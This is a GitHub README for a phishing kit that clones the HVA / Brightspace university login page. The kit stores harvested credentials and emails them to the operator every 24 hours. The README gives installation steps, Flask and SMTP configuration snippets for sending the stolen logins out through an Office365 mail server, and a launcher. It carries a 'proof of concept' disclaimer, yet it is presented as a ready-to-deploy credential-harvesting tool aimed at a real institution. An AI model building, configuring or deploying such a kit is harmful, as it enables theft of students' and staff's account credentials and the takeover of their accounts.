# HVA-Brightspace-login-phishing-site
A HVA / Brightspace login fishing page that stores the harvested credentials and sends a mail every 24 hours with the credentials to your email


# HVA / Brightspace Login phishing page

This phishing page is a proof of concept and should not be used for any illegal activity!

![image](https://user-images.githubusercontent.com/99695922/207714240-ba838eb2-645c-4b43-85fa-1a69ddc4bb4e.png)


The phishing page works on desktop and mobile. Every 24 hours it will send a email with the harvested credentials to  a email of your liking.

This was made with [Tailwind](https://tailwindcss.com/) for the front-end and [Flask](https://flask.palletsprojects.com/en/2.2.x/) for the back-end.


## Installation

Clone this repository.

Then use the package manager [pip](https://pip.pypa.io/en/stable/) to install packages.

```bash
pip install -r requirements.txt
```

## Setup
Open app.py

change YOUR_SECRET_KEY to a secret key of your liking.

```python
app = Flask(__name__)
app.config['SECRET_KEY'] = 'YOUR_SECRET_KEY'
```
Change FROM_EMAIL to the email you are going to send then mail from.
Change TO_EMAIL to the email you are going to send the email to.

```python
    email = EmailMessage()
    email['Subject'] = f'information {datetime.datetime.now()}'
    email['From'] = 'FROM_EMAIL'
    email['To'] = 'TO_EMAIL'
```

Change FROM_EMAIL to the email you are going to send then mail from.

Change FROM_EMAIL_PASSWORD to the email password you are going to send the email from. Make sure the password you provided is compatible with the [SMTP servers](https://support.leapwork.com/s/article/HowcanIgetmySMTPserverPortusernamepassword633070924e681) from your email provider!

```python
    with smtplib.SMTP("smtp.office365.com", 587) as s:
        s.starttls()
        s.login('FROM_EMAIL', 'FROM_EMAIL_PASSWORD')
        s.send_message(email)
```

Change smtp.office365.com to the SMTP server of your provider, if your email provider is Office365 then you can skip this stap.
Change 587 to the port of the SMTP server the email provider uses.
Big ones: [Microsoft](https://support.microsoft.com/nl-nl/office/pop-imap-en-smtp-instellingen-8361e398-8af4-4e97-b147-6c6c4ac95353) , [Gmail](https://support.google.com/a/answer/176600?hl) and [Yahoo](https://help.yahoo.com/kb/SLN4724.html?guccounter=1&guce_referrer=aHR0cHM6Ly93d3cuZ29vZ2xlLmNvbS8&guce_referrer_sig=AQAAADrjXz1-m11zrZhIx972CRNXarnhPdnhwhb85biWlHoDK_LTW9LTFNnj4zCxcvZzG0NTwWgTJOGD67JVD1jcXtVi1udPhmZia8U5Aqud5CVQxVaFRz2ZwbLbR8l5fMSoYJSXFV4NBSnk8z2pubhMMWBtSs1mXrzKIJAjjePa9_FL).

Ones everthing is done close and save app.py
then click one the LAUNCH.bat and see for your self!


## Contributing

Pull requests are welcome. For major changes, please open an issue first
to discuss what you would like to change.

Please make sure to update tests as appropriate.

## License

[MIT](https://choosealicense.com/licenses/mit/)
